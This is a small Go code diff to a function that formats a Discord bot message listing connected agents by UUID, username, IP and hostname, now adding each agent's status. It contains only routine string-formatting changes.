@@ -81,7 +81,7 @@ func GetBotAgents() *discordgo.MessageSend {
 	// fmt.Println(data[0].Uuid)
 	var results strings.Builder
 	for i := range data {
-		fmt.Fprintf(&results, "%s %s@%s %s\n", data[i].Uuid, data[i].Username, data[i].AgentIP, data[i].Hostname)
+		fmt.Fprintf(&results, "%s %s@%s %s <%s>\n", data[i].Uuid, data[i].Username, data[i].AgentIP, data[i].Hostname, data[i].Status)
 	}
 	// fmt.Println(results.String())
 
